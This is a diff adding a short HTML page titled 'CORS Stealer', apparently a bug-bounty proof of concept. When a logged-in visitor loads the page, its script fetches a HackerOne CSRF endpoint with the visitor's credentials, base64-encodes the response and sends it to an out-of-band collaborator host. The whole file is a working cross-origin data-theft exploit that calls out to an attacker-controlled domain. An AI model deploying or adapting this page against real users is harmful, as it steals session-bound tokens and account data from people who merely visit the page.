@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Stealer</title>
+</head>
+<body>
+  <h1>💀 CORS Exploit Active</h1>
+  <script>
+    fetch("https://hackerone.com/user/csrf", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("💉 CORS Response:", data);
+
+      // 🎯 Exfiltrate to your Burp Collaborator domain
+      fetch("https://uqzlsysrbcsyahvblusfdfedocb2a63ps.oast.fun/?leak=" + btoa(data));
+    })
+    .catch(err => console.error("❌ Exploit failed:", err));
+  </script>
+</body>
+</html>
